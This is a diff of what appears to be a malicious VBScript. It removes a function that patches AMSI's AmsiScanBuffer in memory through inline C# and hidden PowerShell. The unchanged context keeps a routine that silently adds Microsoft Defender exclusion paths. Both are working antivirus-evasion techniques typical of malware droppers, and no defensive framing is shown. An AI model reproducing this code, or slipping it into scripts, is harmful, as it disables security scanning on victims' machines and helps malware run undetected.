@@ -97,12 +97,3 @@ Sub AddDefenderExclusion(path)
     RunHidden "powershell -NoProfile -ExecutionPolicy Bypass -Command Add-MpPreference -ExclusionPath '" & path & "' -Force"
 End Sub
 
-' AMSI Bypass Function
-Function AmsiBypass()
-    Dim amsiBypassCode
-    amsiBypassCode = "Add-Type @""using System; using System.Runtime.InteropServices; public class AmsiBypass { [DllImport(""kernel32"")] public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName); [DllImport(""kernel32"")] public static extern IntPtr LoadLibrary(string lpFileName); [DllImport(""kernel32"")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect); public static void PatchAmsi() { IntPtr amsiAddr = GetProcAddress(LoadLibrary(""amsi.dll""), ""AmsiScanBuffer""); if (amsiAddr != IntPtr.Zero) { byte[] patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; uint oldProtect; VirtualProtect(amsiAddr, (UIntPtr)patch.Length, 0x40, out oldProtect); Marshal.Copy(patch, 0, amsiAddr, patch.Length); } } }""@"
-    RunHidden "powershell -NoProfile -ExecutionPolicy Bypass -Command " & amsiBypassCode
-End Function
-
-' Call AMSI Bypass function
-AmsiBypass()
